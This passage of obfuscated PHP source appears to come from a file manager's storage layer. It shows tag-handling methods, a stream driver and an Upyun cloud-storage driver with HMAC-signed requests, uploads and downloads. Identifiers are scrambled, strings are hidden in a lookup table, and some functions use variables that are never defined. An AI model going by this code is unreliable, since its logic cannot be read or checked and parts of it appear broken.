$_SERVER[Á÷ ­Šë]; $ïñ¹‡ = array($á‡Òş§¬[1565] => 0, $á‡Òş§¬[487] => array($á‡Òş§¬[1856], 0), $á‡Òş§¬[427] => $á‡Òş§¬[1857] . $Ó˜êà); $Ïû’å¡Å = $á‡Òş§¬[1858]; $áõÇ‹• = $this->field($Ïû’å¡Å)->where($ïñ¹‡)->order($á‡Òş§¬[1859])->select(); return $áõÇ‹• ? $áõÇ‹• : array(); } protected function addToTag($úá µ™Ÿ, $šÏäïæğ, $µìÂı‰§) { $ÁÄşñë¢ =& $_SERVER[Á÷ ­Šë]; if (!$this->getByTagID($úá µ™Ÿ, $µìÂı‰§) || !$šÏäïæğ) { return !1; } if (!Model($ÁÄşñë¢[827])->pathInfo($šÏäïæğ)) { return !1; } $“€­Óøü = array($ÁÄşñë¢[1565] => 0, $ÁÄşñë¢[487] => $µìÂı‰§, $ÁÄşñë¢[426] => $šÏäïæğ, $ÁÄşñë¢[427] => $ÁÄşñë¢[1860] . $úá µ™Ÿ, $ÁÄşñë¢[425] => $ÁÄşñë¢[33], $ÁÄşñë¢[1746] => 0); if ($this->where($“€­Óøü)->find()) { return !1; } return $this->add($“€­Óøü); } protected function removeFromTag($Êˆ£…¾£, $†¸°Í¬Ì, $ñ«åÌÂŒ) { $˜Ò¸´ü =& $_SERVER[Á÷ ­Šë]; if (!$this->getByTagID($Êˆ£…¾£, $ñ«åÌÂŒ) || !$†¸°Í¬Ì) { return !1; } if (is_array($†¸°Í¬Ì)) { $†¸°Í¬Ì = array($˜Ò¸´ü[7], $†¸°Í¬Ì); } $ ÈµÃöÖ = array($˜Ò¸´ü[1565] => 0, $˜Ò¸´ü[487] => $ñ«åÌÂŒ, $˜Ò¸´ü[427] => $˜Ò¸´ü[1860] . $Êˆ£…¾£, $˜Ò¸´ü[426] => $†¸°Í¬Ì); return $this->where($ ÈµÃöÖ)->delete(); } protected function removeByTag($Ú£Î‘÷, $—º¸ë¬­) { $ê¸ğŒü‚ =& $_SERVER[Á÷ ­Šë]; if (!$this->getByTagID($Ú£Î‘÷, $—º¸ë¬­)) { return !1; } $ÙçÉí = array($ê¸ğŒü‚[1565] => 0, $ê¸ğŒü‚[487] => $—º¸ë¬­, $ê¸ğŒü‚[427] => $ê¸ğŒü‚[1860] . $Ú£Î‘÷); return $this->where($ÙçÉí)->delete(); } protected function removeBySource($£“ÀŠ², $¥¿¡“Íú) { $²Ÿò“‚Î =& $_SERVER[Á÷ ­Šë]; if (!$£“ÀŠ² || !$¥¿¡“Íú) { return !1; } if (is_array($¥¿¡“Íú)) { $¥¿¡“Íú = array($²Ÿò“‚Î[7], $¥¿¡“Íú); } $¦²ù“¸Ë = array($²Ÿò“‚Î[1565] => 0, $²Ÿò“‚Î[426] => $¥¿¡“Íú, $²Ÿò“‚Î[487] => array($²Ÿò“‚Î[1006], 0), $²Ÿò“‚Î[427] => $²Ÿò“‚Î[1860] . $£“ÀŠ²); return $this->where($¦²ù“¸Ë)->delete(); } } goto c¥Ø’¡Ğå; bª–Ä£‰Ô­: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($åèØšœì, $®ŒÓ¸ãÑ = 0) { parent::__construct(); $this->source = $åèØšœì; $this->sourceSize = $®ŒÓ¸ãÑ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ïıÎ¶ö’ = false) { return $this->sourceSize; } public function getContent($ĞßÁŸ“Ú = false) { return $this->fileSubstr($ĞßÁŸ“Ú, 0, $this->sourceSize); } public function fileSubstr($½ŞÅÆ—Ï = false, $®œ¦š§÷ = 0, $˜™êÒÕ¬ = 0) { if (!$˜™êÒÕ¬) { $˜™êÒÕ¬ = $this->sourceSize; } $¥ÆÚˆô³ = $this->sourceSize - $®œ¦š§÷; if ($˜™êÒÕ¬ >= $¥ÆÚˆô³) { $˜™êÒÕ¬ = $¥ÆÚˆô³; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $®œ¦š§÷, $˜™êÒÕ¬); } if ($this->sourceType == self::TYPE_FILE) { if ($˜™êÒÕ¬ <= 0) { return $_SERVER[Á÷ ­Šë][33]; } $‹û‰é¨ï = ftell($this->source); fseek_64($this->source, $‹û‰é¨ï + $®œ¦š§÷); $”œŠã«¬ = @fread($this->source, $˜™êÒÕ¬); fseek_64($this->source, $‹û‰é¨ï); return $”œŠã«¬; } } public function hashMd5($¿‚ÙñÙÔ = false) { return md5($this->getContent()); } public static function hash($¹³Ì´ë, $œ°°ë±÷ = 0) { $¶¥Œ”€˜ = new PathDriverStream($¹³Ì´ë, $œ°°ë±÷); return $¶¥Œ”€˜->hashSimple($¹³Ì´ë); } public static function md5($ªüñÑ´ , $¥ÆñÅØ³ = 0) { $İŠª–†İ = new PathDriverStream($ªüñÑ´ , $¥ÆñÅØ³); return $İŠª–†İ->hashMd5($ªüñÑ´ ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\72\x2f\x2f\x76\x30\x2e\x61\160\x69\x2e\x75\160\171\x75\x6e\56\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ÉÀ¾ªë) { parent::__construct(); $this->_init($ÉÀ¾ªë); } public function _init($ÁÜÎ”ãî) { $œ«¶æÙ =& $_SERVER[Á÷ ­Šë]; foreach ($ÁÜÎ”ãî as $ƒÎÖıÎ† => $‘‘Ü¨ƒå) { if (isset($this->{$ƒÎÖıÎ†})) { $this->{$ƒÎÖıÎ†} = $‘‘Ü¨ƒå; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($œ«¶æÙ[1373] . LNG($œ«¶æÙ[1306])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($äªğñ‚ø, $¡ñ¡ÊÉ‡ = "\x47\x45\124") { $áœş©Ğ· =& $_SERVER[Á÷ ­Šë]; $üÊâÛ¡ê = gmdate($áœş©Ğ·[1339]); $„ÜÒÒ» = base64_encode(hash_hmac($áœş©Ğ·[1374], "{$¡ñ¡ÊÉ‡}\46{$äªğñ‚ø}\x26{$üÊâÛ¡ê}", md5("{$this->userpass}"), !0)); $óàİÈåË = array("\x41\165\164\150\157\x72\151\x7a\x61\164\x69\157\x6e\72\x55\x50\x59\125\x4e\x20{$this->username}\72{$„ÜÒÒ»}", "\104\141\x74\145\72{$üÊâÛ¡ê}"); return $óàİÈåË; } public function ussRequest($˜Õ¿¸’, $Ò¼¥ğ´È = "\107\105\x54", $³’¨óŒ™ = false, $Ë™›ÄÈ˜ = false, $çŸëéÜÒ = false) { $†¼ÃÛ² =& $_SERVER[Á÷ ­Šë]; $˜Õ¿¸’ = trim($˜Õ¿¸’, $†¼ÃÛ²[8]); $âÂùÇë = "\57{$this->bucket}\57{$˜Õ¿¸’}"; $¡ÓµÚ´ = $this->ussHeaders($âÂùÇë, $Ò¼¥ğ´È); if ($Ë™›ÄÈ˜) { $¡ÓµÚ´ = array_merge($¡ÓµÚ´, $Ë™›ÄÈ˜); } $“°ãÎ• = url_request($this->endpoint . $âÂùÇë, $Ò¼¥ğ´È, $³’¨óŒ™, $¡ÓµÚ´, $çŸëéÜÒ); if (!$“°ãÎ•) { return array($†¼ÃÛ²[1117] => !1, $†¼ÃÛ²[1119] => $†¼ÃÛ²[1375]); } if (strtolower($Ò¼¥ğ´È) == $†¼ÃÛ²[200] || in_array($“°ãÎ•[$†¼ÃÛ²[1117]], array($†¼ÃÛ²[1232], $†¼ÃÛ²[1376]))) { $³’¨óŒ™ = $“°ãÎ•[$†¼ÃÛ²[1377]]; } else { $³’¨óŒ™ = json_decode($“°ãÎ•[$†¼ÃÛ²[1119]], !0); if (!$³’¨óŒ™) { $³’¨óŒ™ = $“°ãÎ•[$†¼ÃÛ²[1119]]; } else { if (!$“°ãÎ•[$†¼ÃÛ²[745]] && isset($³’¨óŒ™[$†¼ÃÛ²[1378]])) { $³’¨óŒ™ = $³’¨óŒ™[$†¼ÃÛ²[1378]]; } } } return array($†¼ÃÛ²[1117] => $“°ãÎ•[$†¼ÃÛ²[745]], $†¼ÃÛ²[1119] => $³’¨óŒ™); } public function mkfile($ğ£©Œ, $¼”æÒïÆ = '', $îåíŞ“Ç = REPEAT_RENAME) { if ($this->setContent($ğ£©Œ, $¼”æÒïÆ)) { return $this->getPathOuter($ğ£©Œ); } return !1; } public function mkdir($á¸ÒùÜ, $¼Ó¸ÎÌ¢ = REPEAT_SKIP) { $±òÕö³Á =& $_SERVER[Á÷ ­Šë]; $î£…÷ò¼ = trim($á¸ÒùÜ, $±òÕö³Á[8]); if ($this->_isFolder($î£…÷ò¼)) { return $this->getPathOuter($î£…÷ò¼); } $ÕôÏœ•Ñ = array($±òÕö³Á[1379]); $ÍÒŠÊÚí = $this->ussRequest($î£…÷ò¼, $±òÕö³Á[234], !1, $ÕôÏœ•Ñ); return $ÍÒŠÊÚí[$±òÕö³Á[1117]] ? $this->getPathOuter($î£…÷ò¼) : !1; } public function copyFile($ÆßÈ† , $èŸä€ı) { $ÒÌ¬‰ =& $_SERVER[Á÷ ­Šë]; $“Æš”â = array($ÒÌ¬‰[1380] . "\57{$this->bucket}\57{$ÆßÈ† }", $ÒÌ¬‰[1381]); $€»ıÉ²‘ = $this->ussRequest($èŸä€ı, $ÒÌ¬‰[236], !1, $“Æš”â); return $€»ıÉ²‘[$ÒÌ¬‰[1117]] ? !0 : $this->getPathOuter($èŸä€ı); } public function moveFile($ Û•íõº, $ì”åõÄé) { $›î»È´ =& $_SERVER[Á÷ ­Šë]; $“Éà‚è = array($›î»È´[1382] . "\x2f{$this->bucket}\x2f{$ Û•íõº}", $›î»È´[1381]); $İ¤·èÉÖ = $this->ussRequest($ì”åõÄé, $›î»È´[236], !1, $“Éà‚è); return $İ¤·èÉÖ[$›î»È´[1117]] ? !0 : $this->getPathOuter($ì”åõÄé); } public function delFile($ËœÛï³Š) { $€Ã÷­÷ =& $_SERVER[Á÷ ­Šë]; $‘ØÌ¥’’ = $this->ussRequest($ËœÛï³Š, $€Ã÷­÷[1383]); return $‘ØÌ¥’’[$€Ã÷­÷[1117]] ? !0 : !1; } public function delFolder($¯ô„ƒá²) { $ñ§ÇÁéñ =& $_SERVER[Á÷ ­Šë]; if (!$this->exist($¯ô„ƒá²)) { return !0; } $this->listItemCache = !1; $ãûşı = $Ş„ù† = array(); $this->fileList($¯ô„ƒá², $ãûşı, $Ş„ù†, !0); $this->listItemCache = !0; foreach ($Ş„ù† as $Òø¹Éä») { $äÔŸ¥ü™ = $this->ussRequest($Òø¹Éä»[$ñ§ÇÁéñ[28]], $ñ§ÇÁéñ[1383]); if (!$äÔŸ¥ü™[$ñ§ÇÁéñ[1117]]) { return !1; } } foreach ($ãûşı as $ï‰¡” Ñ) { $äÔŸ¥ü™ = $this->ussRequest($ï‰¡” Ñ, $ñ§ÇÁéñ[1383]); if (!$äÔŸ¥ü™[$ñ§ÇÁéñ[1117]]) { return !1; } } $äÔŸ¥ü™ = $this->ussRequest($¯ô„ƒá², $ñ§ÇÁéñ[1383]); return $äÔŸ¥ü™[$ñ§ÇÁéñ[1117]]; } public function rename($§À…ÖØ€, $¹ïÄ¬®á) { if ($this->isFile($§À…ÖØ€)) { $¹ïÄ¬®á = get_path_father($§À…ÖØ€) . $¹ïÄ¬®á; return $this->moveFile($§À…ÖØ€, $¹ïÄ¬®á); } return $this->renameObject($§À…ÖØ€, $¹ïÄ¬®á); } public function fileInfo($¸ğç¬ —, $»ã«Éİ = false, $ĞÀõ¤°¨ = array()) { $ã††ÂÁ =& $_SERVER[Á÷ ­Šë]; $¥ÊÖàı¼ = array($ã††ÂÁ[28] => $this->pathThis($¸ğç¬ —), $ã††ÂÁ[86] => $this->getPathOuter($ã††ÂÁ[8] . $¸ğç¬ —), $ã††ÂÁ[29] => $ã††ÂÁ[203], $ã††ÂÁ[88] => isset($ĞÀõ¤°¨[$ã††ÂÁ[88]]) ? $ĞÀõ¤°¨[$ã††ÂÁ[88]] : 0, $ã††ÂÁ[178] => $this->ext($¸ğç¬ —)); if ($»ã«Éİ) { return $¥ÊÖàı¼; } $¥ÊÖàı¼[$ã††ÂÁ[204]] = $¥ÊÖàı¼[$ã††ÂÁ[94]] = 0; $¥ÊÖàı¼[$ã††ÂÁ[205]] = $¥ÊÖàı¼[$ã††ÂÁ[206]] = !0; if (empty($ĞÀõ¤°¨)) { $ĞÀõ¤°¨ = $this->objectMeta($¸ğç¬ —); if (!$ĞÀõ¤°¨) { return $¥ÊÖàı¼; } } $¥ÊÖàı¼[$ã††ÂÁ[204]] = intval($ĞÀõ¤°¨[$ã††ÂÁ[1384]]); $¥ÊÖàı¼[$ã††ÂÁ[94]] = intval($ĞÀõ¤°¨[$ã††ÂÁ[1385]]); $¥ÊÖàı¼[$ã††ÂÁ[88]] = $ĞÀõ¤°¨[$ã††ÂÁ[88]]; return $¥ÊÖàı¼; } public function folderInfo($‘“’‘Î—, $‹“ú€š˜ = false) { $ËÍ»‹…Ó =& $_SERVER[Á÷ ­Šë]; $²ŠçĞÛ¸ = array($ËÍ»‹…Ó[28] => $this->pathThis($‘“’‘Î—), $ËÍ»‹…Ó[86] => $this->getPathOuter($ËÍ»‹…Ó[8] . $‘“’‘Î—), $ËÍ»‹…Ó[29] => $ËÍ»‹…Ó[87]); if ($‹“ú€š˜) { return $²ŠçĞÛ¸; } $²ŠçĞÛ¸[$ËÍ»‹…Ó[204]] = $²ŠçĞÛ¸[$ËÍ»‹…Ó[94]] = 0; $²ŠçĞÛ¸[$ËÍ»‹…Ó[205]] = $²ŠçĞÛ¸[$ËÍ»‹…Ó[206]] = !0; if (empty($×µ¶ìÕî)) { $×µ¶ìÕî = $this->objectMeta($‘“’‘Î—); if (!$×µ¶ìÕî) { return $²ŠçĞÛ¸; } } $²ŠçĞÛ¸[$ËÍ»‹…Ó[204]] = intval($×µ¶ìÕî[$ËÍ»‹…Ó[1384]]); $²ŠçĞÛ¸[$ËÍ»‹…Ó[94]] = intval($×µ¶ìÕî[$ËÍ»‹…Ó[1385]]); return $²ŠçĞÛ¸; } private function listObjs($˜†ı®¦, $îşÑŸ©¶ = 0, $òêêÚİ¹ = 1000) { $¥¡ÕĞõé =& $_SERVER[Á÷ ­Šë]; $ÄÃ¸È¬… = array($¥¡ÕĞõé[1386], $¥¡ÕĞõé[1387] . $òêêÚİ¹); if ($îşÑŸ©¶) { $ÄÃ¸È¬…[] = $¥¡ÕĞõé[1388] . $îşÑŸ©¶; } $Œš¦á„Ò = $this->ussRequest($˜†ı®¦, $¥¡ÕĞõé[238], !1, $ÄÃ¸È¬…); return !$Œš¦á„Ò[$¥¡ÕĞõé[1117]] ? !1 : $Œš¦á„Ò[$¥¡ÕĞõé[1119]]; } private function fileList($ŞÅ•ìò, &$ÏÖ‡”ã¢, &$ôÃÈí—Ô, $ ªñÌ‘ = false) { $Í˜ÈÊñÚ =& $_SERVER[Á÷ ­Šë]; $ÚÂ‡šßˆ = $Í˜ÈÊñÚ[33]; $…‹ØÃÁÔ = 1000; $ØÁ–ïÏš = rtrim($ŞÅ•ìò, $Í˜ÈÊñÚ[8]) . $Í˜ÈÊñÚ[8]; $‰„¨Î = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $­£ëÊ– = $this->listObjs($ŞÅ•ìò, $ÚÂ‡šßˆ, $…‹ØÃÁÔ); if (!$­£ëÊ–) { return !1; } $ÚÂ‡šßˆ = isset($­£ëÊ–[$Í˜ÈÊñÚ[1389]]) ? $­£ëÊ–[$Í˜ÈÊñÚ[1389]] : $Í˜ÈÊñÚ[33]; $§‡¢„÷ = isset($­£ëÊ–[$Í˜ÈÊñÚ[1390]]) ? $­£ëÊ–[$Í˜ÈÊñÚ[1390]] : array(); foreach ($§‡¢„÷ as $Ğ”œ»ÚÆ) { $ÏĞ±˜Ò = $Ğ”œ»ÚÆ[$Í˜ÈÊñÚ[29]] == $Í˜ÈÊñÚ[87] ? !0 : !1; $‹œÜ¦Û‹ = ltrim($ØÁ–ïÏš . $Ğ”œ»ÚÆ[$Í˜ÈÊñÚ[28]], $Í˜ÈÊñÚ[8]) . ($ÏĞ±˜Ò ? $Í˜ÈÊñÚ[8] : $Í˜ÈÊñÚ[33]); $ôœşÊ—« = array($Í˜ÈÊñÚ[28] => $‹œÜ¦Û‹, $Í˜ÈÊñÚ[29] => $ÏĞ±˜Ò ? $Í˜ÈÊñÚ[87] : $Í˜ÈÊñÚ[203], $Í˜ÈÊñÚ[88] => $Ğ”œ»ÚÆ[$Í˜ÈÊñÚ[344]], $Í˜ÈÊñÚ[1385] => $Ğ”œ»ÚÆ[$Í˜ÈÊñÚ[1391]]); if ($‰„¨Î) { $this->cacheMethod($Í˜ÈÊñÚ[209], $‹œÜ¦Û‹, $ÏĞ±˜Ò); $this->cacheMethod($Í˜ÈÊñÚ[210], $‹œÜ¦Û‹, $ôœşÊ—«); } if ($ÏĞ±˜Ò) { $ÏÖ‡”ã¢[] = $‹œÜ¦Û‹; if ($ ªñÌ‘) { $this->fileList($‹œÜ¦Û‹, $ÏÖ‡”ã¢, $ôÃÈí—Ô, $ ªñÌ‘); } continue; } $ôÃÈí—Ô[] = $ôœşÊ—«; } if (count($§‡¢„÷) < $…‹ØÃÁÔ) { break; } } if ($‰„¨Î) { $this->cacheMethod($Í˜ÈÊñÚ[209], $ŞÅ•ìò, !0); } } public function listPath($íá’ç®°, $­ñüÓ¬÷ = false) { $Ğ ‡Ê­à =& $_SERVER[Á÷ ­Šë]; $Å–¬ÄÓ˜ = $¯’©Š¸© = array(); $this->fileList($íá’ç®°, $Å–¬ÄÓ˜, $¯’©Š¸©); foreach ($Å–¬ÄÓ˜ as $ÑÊ™šÙ => $Ş‚¸çºÒ) { $Å–¬ÄÓ˜[$ÑÊ™šÙ] = $this->folderInfo($Ş‚¸çºÒ, $­ñüÓ¬÷); } foreach ($¯’©Š¸© as $ÑÊ™šÙ => $Ş‚¸çºÒ) { $¯’©Š¸©[$ÑÊ™šÙ] = $this->fileInfo($Ş‚¸çºÒ[$Ğ ‡Ê­à[28]], $­ñüÓ¬÷, $Ş‚¸çºÒ); } return array($Ğ ‡Ê­à[85] => $Å–¬ÄÓ˜, $Ğ ‡Ê­à[84] => $¯’©Š¸©); } public function has($¤ôÎı¦¶, $ëÑœìã = false, $ó›Œ”ğë = true) { $ôï¹´×ü =& $_SERVER[Á÷ ­Šë]; $âœ™éÉÎ = $ôï¹´×ü[33]; $’à‰óŞ÷ = 500; $¡Øç‡¿ì = 0; $«úªéÎ = 0; $áµ»–•ë = rtrim($¤ôÎı¦¶, $ôï¹´×ü[8]) . $ôï¹´×ü[8]; while (!0) { check_abort(); $Àéğ¡ßÕ = $this->listObjs($¤ôÎı¦¶, $âœ™éÉÎ, $’à‰óŞ÷); if (!$Àéğ¡ßÕ) { return !1; } $âœ™éÉÎ = isset($Àéğ¡ßÕ[$ôï¹´×ü[1389]]) ? $Àéğ¡ßÕ[$ôï¹´×ü[1389]] : $ôï¹´×ü[33]; $¾¨ÔÂ¿ = isset($Àéğ¡ßÕ[$ôï¹´×ü[1390]]) ? $Àéğ¡ßÕ[$ôï¹´×ü[1390]] : array(); if (empty($¾¨ÔÂ¿)) { break; } $Ä¢õéóÍ = array_filter($¾¨ÔÂ¿, function ($ª«ÛìÊã) { $àîä§ğÓ =& $_SERVER[Á÷ ­Šë]; return $ª«ÛìÊã[$àîä§ğÓ[29]] == $àîä§ğÓ[87]; }); $÷Ú¾÷Â = count($¾¨ÔÂ¿); $Ä¢õéóÍ = count($Ä¢õéóÍ); $»ùá†öğ = $÷Ú¾÷Â - $Ä¢õéóÍ; if ($ëÑœìã) { $«úªéÎ += $Ä¢õéóÍ; $¡Øç‡¿ì += $»ùá†öğ; if ($÷Ú¾÷Â < $’à‰óŞ÷) { break; } continue; } if ($ó›Œ”ğë) { if ($»ùá†öğ) { return !0; } } else { if ($Ä¢õéóÍ) { return !0; } } if ($÷Ú¾÷Â < $’à‰óŞ÷) { break; } } if ($ëÑœìã) { return array($ôï¹´×ü[213] => $¡Øç‡¿ì, $ôï¹´×ü[214] => $«úªéÎ); } return !1; } public function listAll($ş¶èö†©) { $àû¶Øø =& $_SERVER[Á÷ ­Šë]; $Ÿ¨çÖ© = $Ğ²§³•· = array(); $this->fileList($ş¶èö†©, $Ÿ¨çÖ©, $Ğ²§³•·, !0); $ŸßÖÍ¦ø = array(); foreach ($Ğ²§³•· as $¦ÖëÓ¿) { $ŸßÖÍ¦ø[$¦ÖëÓ¿[$àû¶Øø[28]]] = $¦ÖëÓ¿[$àû¶Øø[88]]; } foreach ($Ÿ¨çÖ© as $¦ÖëÓ¿) { if (is_string($¦ÖëÓ¿)) { $ŸßÖÍ¦ø[$¦ÖëÓ¿] = 0; } } return $this->listAllFiles($ş¶èö†©, array_keys($ŸßÖÍ¦ø), $ŸßÖÍ¦ø); } public function canRead($“‚€¾Û) { return $this->exist($“‚€¾Û) ? !0 : !1; } public function canWrite($ø­³ÔÈÛ) { return $this->exist($ø­³ÔÈÛ) ? !0 : !1; } public function getContent($£ºå¿‰ã) { return $this->fileSubstr($£ºå¿‰ã, 0, -1); } public function setContent($„×öÇœŸ, $¸ûÚŠÀĞ = '') { $§°ÁÊÂõ =& $_SERVER[Á÷ ­Šë]; if (!$¸ûÚŠÀĞ) { $‰†»ÄÕç = $this->ussRequest($„×öÇœŸ, $§°ÁÊÂõ[234]); return $‰†»ÄÕç[$§°ÁÊÂõ[1117]]; } $ÎØ®€¿ê = $this->tempFile($this->pathThis($„×öÇœŸ)); file_put_contents($ÎØ®€¿ê, $¸ûÚŠÀĞ); if ($this->upload($„×öÇœŸ, $ÎØ®€¿ê)) { $this->tempFileRemve($ÎØ®€¿ê); return !0; } return !1; } public function fileSubstr($óƒµ¯ÄÃ, $Ó¬§òü­, $¨€ôŞŞé) { $¸¸åÀ€ã =& $_SERVER[Á÷ ­Šë]; if (!($›êªÄ©î = $this->link($óƒµ¯ÄÃ))) { return !1; } $¨ÄìÂù = !1; if ($¨€ôŞŞé > 0) { $ã±Î…Üë = $Ó¬§òü­ + $¨€ôŞŞé - 1; $¨ÄìÂù = array($¸¸åÀ€ã[1352] . $Ó¬§òü­ . $¸¸åÀ€ã[464] . $ã±Î…Üë); } $õ¨©š¤ò = url_request($›êªÄ©î, $¸¸åÀ€ã[238], !1, $¨ÄìÂù); return $õ¨©š¤ò[$¸¸åÀ€ã[745]] ? $õ¨©š¤ò[$¸¸åÀ€ã[1119]] : !1; } public function upload($áŒ‡¥·í, $ò­¢ ³Ù, $¶îığüŠ = false, $”òå‘›´ = REPEAT_REPLACE) { $‰©Ûœ =& $_SERVER[Á÷ ­Šë]; $×Ùø²‡ = IO::size($ò­¢ ³Ù); if ($×Ùø²‡ <= 1024 * 1024 * 200) { $µÄ±öêù = array($‰©Ûœ[1392] . $ò­¢ ³Ù); $­é¯Â®ƒ = $this->ussRequest($áŒ‡¥·í, $‰©Ûœ[236], $µÄ±öêù); return $­é¯Â®ƒ[$‰©Ûœ[1117]] ? $this->getPathOuter($áŒ‡¥·í) : !1; } $÷¸¿µòÕ = 1024 * 1024 * 10; $ı†Öç—¡ = array($‰©Ûœ[1393], $‰©Ûœ[1394] . $×Ùø²‡, $‰©Ûœ[1395], $‰©Ûœ[1396] . $÷¸¿µòÕ); $­é¯Â®ƒ = $this->ussRequest($áŒ‡¥·í, $‰©Ûœ[236], !1, $ı†Öç—¡); if (!$­é¯Â®ƒ[$‰©Ûœ[1117]]) { return !1; } $ÃÊÅâÔà = $­é¯Â®ƒ[$‰©Ûœ[1119]]; $¼ó ‹şÉ = 0; $¯áÔç = $ÃÊÅâÔà[$‰©Ûœ[1397]]; $¡Â’—ÖÔ = fopen($ò­¢ ³Ù, $‰©Ûœ[1303]); if (!$¡Â’—ÖÔ) { return !1; } do { $ÆË¤Æä´ = $ÃÊÅâÔà[$‰©Ûœ[1398]]; fseek_64($¡Â’—ÖÔ, $¼ó ‹şÉ); $Ü¼‰ç”è = fread($¡Â’—ÖÔ, $ÆË¤Æä´); $ªöêÙƒ = 0; do { $ªöêÙƒ++; $ÃÊÅâÔà = $this->uploadPart($áŒ‡¥·í, $ÃÊÅâÔà, $Ü¼‰ç”è); } while (!$ÃÊÅâÔà && $ªöêÙƒ < 3); if (!$ÃÊÅâÔà) { return !1; } $¯áÔç = $ÃÊÅâÔà[$‰©Ûœ[1397]]; $¼ó ‹şÉ += $ÆË¤Æä´; } while ($¯áÔç != -1); fclose($¡Â’—ÖÔ); $ı†Öç—¡ = array($‰©Ûœ[1399], $‰©Ûœ[1400] . $ÃÊÅâÔà[$‰©Ûœ[1401]], $‰©Ûœ[1395]); $­é¯Â®ƒ = $this->ussRequest($áŒ‡¥·í, $‰©Ûœ[236], !1, $ı†Öç—¡); return $­é¯Â®ƒ[$‰©Ûœ[1117]] ? $this->getPathOuter($–£¨†í¬) : !1; } private function uploadPart($…Ó‰”Á¾, $òõ³·µ, &$€Ä½Éøã) { $õ½™›ş‘ =& $_SERVER[Á÷ ­Šë]; $¢»™Äíš = array($õ½™›ş‘[1402], $õ½™›ş‘[1400] . $òõ³·µ[$õ½™›ş‘[1401]], $õ½™›ş‘[1403] . $òõ³·µ[$õ½™›ş‘[1397]], $õ½™›ş‘[151] . $òõ³·µ[$õ½™›ş‘[1398]]); $õ¶·˜£± = $this->ussRequest($…Ó‰”Á¾, $õ½™›ş‘[236], $€Ä½Éøã, $¢»™Äíš); return !$õ¶·˜£±[$õ½™›ş‘[1117]] ? $õ¶·˜£±[$õ½™›ş‘[1117]] : $õ¶·˜£±[$õ½™›ş‘[1119]]; } public function uploadFormData($ÂŒÜïÂ, $ÑÆŸÑëØ = 3600) { return $this->uploadPolicy($ÂŒÜïÂ, $ÑÆŸÑëØ); } public function multiUploadFormData($‰‡Âä·ø, $É‹àëş = 3600) { $™ÛÃ‰£” =& $_SERVER[Á÷ ­Šë]; $æÀÂ‘Àº = (int) $GLOBALS[$™ÛÃ‰£”[7]][$™ÛÃ‰£”[88]]; return $this->uploadPolicy($‰‡Âä·ø, $É‹àëş, $æÀÂ‘Àº); } private function uploadPolicy($˜£¿â… , $ïº“†Á½ = 3600, $öèİÍäÍ = 0) { $‚Ú¯éü =& $_SERVER[Á÷ ­Šë]; $óÂÇÂùÂ = $‚Ú¯éü[8] . $this->bucket; $¦´µùÆ¹ = gmdate($‚Ú¯éü[1339]); $Ø¤µä = array($‚Ú¯éü[1404] => $this->bucket, $‚Ú¯éü[1405] => $˜£¿â… , $‚Ú¯éü[1406] => time() + $ïº“†Á½, $‚Ú¯éü[1407] => $¦´µùÆ¹); if ($öèİÍäÍ) { $Ø¤µä[$‚Ú¯éü[1319]] = $öèİÍäÍ; } $ÂØš¥Šº = base64_encode(json_encode($Ø¤µä)); $ìù²èœê = base64_encode(hash_hmac($‚Ú¯éü[1374], "\120\117\x53\x54\46{$óÂÇÂùÂ}\46{$¦´µùÆ¹}\46{$ÂØš¥Šº}", md5("{$this->userpass}"), !0)); $ÕºùŞ  = array($‚Ú¯éü[1244] => $ÂØš¥Šº, $‚Ú¯éü[1408] => "\x55\x50\x59\125\116\x20{$this->username}\72{$ìù²èœê}", $‚Ú¯éü[185] => $this->endpoint . $óÂÇÂùÂ); return $ÕºùŞ ; } public function download($Æ±ôÑŞÇ, $ğÇŸÒœ) { $Ê¾ö¤–Â = IO::getPathInner(IO::mkfile($ğÇŸÒœ)); if (!($‘‹‰ìœ¤ = $this->link($Æ±ôÑŞÇ))) { return !1; } $İ°ÅœÀÚ = 0; $œÙõ¢ › = 1024 * 200; $·¦¨ ¯ƒ = fopen($Ê¾ö¤–Â, $_SERVER[Á÷ ­Šë][1358]); while (!0) { $ØÍ©‚ä¿ = $this->fileSubstr($Æ±ôÑŞÇ, $İ°ÅœÀÚ, $œÙõ¢ ›); if ($ØÍ©‚ä¿ === !1) { return !1; } fwrite($·¦¨ ¯ƒ, $ØÍ©‚ä¿); $İ°ÅœÀÚ += $œÙõ¢ ›; if (strlen($ØÍ©‚ä¿) < $œÙõ¢ ›) { break; } } fclose($·¦¨ ¯ƒ); return $ğÇŸÒœ; } public function link($ÃÈ¬À¾¨, $Ãœ¯¦êü = array()) { $ª¹˜ÈÕí =& $_SERVER[Á÷ ­Šë]; $ÃÈ¬À¾¨ = trim($ÃÈ¬À¾¨, $ª¹˜ÈÕí[8]); if (!empty($this->token)) { $Ñ±±´ßË = strtotime(date($ª¹˜ÈÕí[1409])); $ÈñÇìÚÏ = substr(md5($this->token . $ª¹˜ÈÕí[291] . $Ñ±±´ßË . $ª¹˜ÈÕí[1410] . $ÃÈ¬À¾¨), 12, 8) . $Ñ±±´ßË; $Ãœ¯¦êü[] = $ª¹˜ÈÕí[1411] . $ÈñÇìÚÏ; } $ÕíÛ·ï• = !empty($Ãœ¯¦êü) ? $ª¹˜ÈÕí[80] . implode($ª¹˜ÈÕí[291], $Ãœ¯¦êü) : $ª¹˜ÈÕí[33]; return $this->getHost() . $ª¹˜ÈÕí[8] . $ÃÈ¬À¾¨ . $ÕíÛ·ï•; } public function fileOut($®ÈŒËÇ“, $†ˆ¯°á = false, $¹éøıê‹ = false, $ƒ´Ö»‚ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($®ÈŒËÇ“, $†ˆ¯°á, $¹éøıê‹, $ƒ´Ö»‚); } if (!$¹éøıê‹) { $¹éøıê‹ = $this->pathThis($®ÈŒËÇ“); } $Ü€Í‘÷ = 